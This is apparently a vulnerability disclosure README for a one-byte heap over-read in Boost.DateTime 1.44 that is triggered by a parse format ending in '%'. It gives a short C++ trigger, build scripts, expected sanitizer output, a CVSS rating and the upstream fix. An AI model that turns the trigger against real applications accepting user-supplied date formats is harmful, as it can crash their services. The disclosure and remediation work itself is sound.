# Boost.DateTime — out-of-bounds read in `time_input_facet::get`

## Trigger

Any parse format that ends in a bare `%` — e.g. `"%"`, `"%Y-%"`, `"x%"` — reached
via `std::istream >> ptime/date/local_date_time` when the stream is imbued with a
`time_input_facet` / `local_time_input_facet` built from that format:

```cpp
std::stringstream ss;
ss.imbue(std::locale(ss.getloc(), new boost::posix_time::time_input_facet(std::string("%"))));
ss.str("2005-01-01 00:00:00");
boost::posix_time::ptime pt; ss >> pt;   // OOB read in time_facet.hpp
```

Default facets use well-formed formats and are not affected. The vulnerable
input is the format string, so the exposure is applications that build a
`time_input_facet` from an attacker- or configuration-supplied date/time format
(e.g. user-selectable date formats / localization settings).

## Files

| File        | Purpose                                                             |
|-------------|--------------------------------------------------------------------|
| `poc.cpp`   | Standalone C++ proof-of-concept (control format + trigger format).  |
| `build.sh`  | Builds `poc.cpp` against the local Boost 1.44 tree; `asan` (default) or `plain`. |
| `poc.sh`    | Single self-contained script — embeds the PoC and builds+runs it. Paste-ready for an email/issue. |
| `poc_asan`  | Prebuilt AddressSanitizer binary (for reference).                   |
| `README.md` | This file.                                                          |


## Build & run

Requires a Boost **1.44** source tree (headers + `libs/date_time/src`) and a C++
compiler (`clang++` by default; AddressSanitizer for the abort). The scripts
default to `../boost_1_44_0`, which is what I used for my testing. Feel free to edit as you see fit.

```bash
# Single self-contained script (recommended for hand-off)
./poc.sh                                  # AddressSanitizer build + run (default)
./poc.sh plain                            # no sanitizer
BOOST=/path/to/boost_1_44_0 ./poc.sh      # point at any Boost 1.44 tree
CXX=g++ ./poc.sh                           # choose the compiler

# Two-file layout (equivalent)
./build.sh          # ASan build + run
./build.sh plain    # no sanitizer
```

The 2010-era headers are compiled with `-std=c++03 -D_GLIBCXX_USE_CXX11_ABI=0` so
they build cleanly against a modern libstdc++.

## Expected output

**AddressSanitizer build** — aborts on the trigger format:

```
==...==ERROR: AddressSanitizer: heap-buffer-overflow ... READ of size 1
0x... is located 0 bytes after 26-byte region
SUMMARY: AddressSanitizer: heap-buffer-overflow
  ...time_facet.hpp:996 in boost::date_time::time_input_facet<...>::get(...)
```

ASan attributes the fault to the loop at line 996; the offending dereference is
line 998.

**Plain build** — no crash; the over-read steers parsing to a garbage value while
the control format parses correctly, demonstrating the read is real but usually
benign without hardening:

```
[*] control (well-formed): parsing with time_input_facet format = "%Y-%m-%d %H:%M:%S"
    parsed value: 2005-Jan-01 00:00:00
[*] TRIGGER (format ends in '%'): parsing with time_input_facet format = "%"
    parsed value: 1400-Jan-01 00:00:00
[!] reached end without a crash (no sanitizer, or a patched Boost >= 1.55)
```

## Impact

Heap over-read of one byte adjacent to the format buffer. The byte only steers a
boolean branch in the parser — no attacker-facing data disclosure. Realized
impact is a crash (denial of service) under sanitized / `_FORTIFY_SOURCE` /
hardened builds or when the byte lands on a page boundary; otherwise the read is
usually benign. Reachable only when the parse *format* is attacker- or
config-influenced.

- **CVSS 3.1:** 5.3 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`
  (drop to `AV:L` → 3.3 Low if the format is only ever locally supplied)

## Remediation

Add the end check after the increment, as Boost did in 1.55:

```cpp
if (*itr == '%') {
    if (++itr == this->m_format.end()) break;   // the missing guard
    if (*itr != '%') { switch(*itr) { ... } }
}
```

Durable fixes: upgrade to Boost ≥ 1.55; and never construct a `time_input_facet`
from an untrusted format string.

## Notes

- The `case 'Z'` block (`time_facet.hpp` ~line 1176: `++itr; if(*itr == 'P')`)
  has the same missing-end-check shape and is still present in current Boost, but
  no reachable trigger was produced — reported upstream as a code observation, not
  a confirmed vulnerability.
- This research targets a 16-year-old release for coordinated disclosure; the bug
  was silently fixed in 1.55 with no CVE or advisory, so the goal is to catalog
  the defect across the exposed older-version range.
